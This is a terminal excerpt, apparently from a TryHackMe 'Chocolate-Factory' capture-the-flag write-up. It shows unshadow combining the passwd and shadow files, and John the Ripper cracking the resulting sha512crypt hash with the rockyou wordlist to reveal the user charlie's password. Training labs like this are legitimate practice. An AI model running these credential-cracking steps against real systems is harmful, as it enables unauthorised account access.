

```

└─$ unshadow passwd shadow > hash

┌──(kraken-pt㉿kali)-[~/TryHackMe-Rooms/Chocolate-Factory]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cn7824           (charlie)     
1g 0:00:03:41 DONE (2024-08-25 13:14) 0.004509g/s 4439p/s 4439c/s 4439C/s cocker6..cn123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
